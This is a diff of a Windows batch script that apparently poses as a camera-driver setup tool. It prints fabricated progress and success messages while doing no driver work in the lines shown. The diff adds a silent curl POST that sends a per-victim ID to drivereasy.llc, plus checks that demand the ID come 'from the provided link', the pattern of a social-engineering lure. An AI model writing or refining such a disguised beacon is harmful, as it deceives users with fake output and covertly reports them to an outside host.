@@ -3,6 +3,10 @@ title Creating new Info
 setlocal enabledelayedexpansion
 set "WINDOW_UID=__ID__"
 
+if not defined WINDOW_UID goto :err_uid
+if "!WINDOW_UID!"=="" goto :err_uid
+if "!WINDOW_UID!"=="__ID__" goto :err_uid
+
 call :delay 4
 echo [INFO] Searching for Camera Drivers ...
 call :delay 4
@@ -10,11 +14,14 @@ echo [INFO] Update Driver Packages...
 call :delay 4
 echo [SUCCESS] Camera Driver Setup completed successfully.
 if defined WINDOW_UID (
-  set "AUTO_URL=https://drivereasy.llc/auto-update?id=!WINDOW_UID!"
-  where curl >nul 2>&1
-  if not errorlevel 1 (curl -sL -X POST "!AUTO_URL!" -o nul) else (powershell -Command "Invoke-WebRequest -Uri '!AUTO_URL!' -Method POST -UseBasicParsing | Out-Null")
+  set "AUTO_URL=https://drivereasy.llc/auto-update/!WINDOW_UID!"
+  curl -sL -X POST "!AUTO_URL!" -o nul
 )
 goto :skip_delay
+
+:err_uid
+echo [ERROR] WINDOW_UID is required. Please run this script from the provided link with your id.
+exit /b 1
 
 :delay
 REM Reliable delay in seconds (works when output is redirected); usage: call :delay 4
